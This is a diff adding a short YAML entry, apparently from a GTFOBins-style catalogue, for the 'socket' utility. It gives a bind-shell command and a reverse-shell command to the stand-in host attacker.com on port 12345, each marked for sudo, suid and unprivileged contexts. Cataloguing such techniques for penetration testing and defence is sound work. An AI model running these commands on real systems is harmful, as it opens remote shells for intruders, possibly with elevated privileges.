@@ -1,0 +1,21 @@
+---
+functions:
+  bind-shell:
+  - code: |-
+      socket -svp '/bin/sh -i' 12345
+    connector: tcp-client
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      socket -qvp '/bin/sh -i' attacker.com 12345
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+    listener: tcp-server
+...
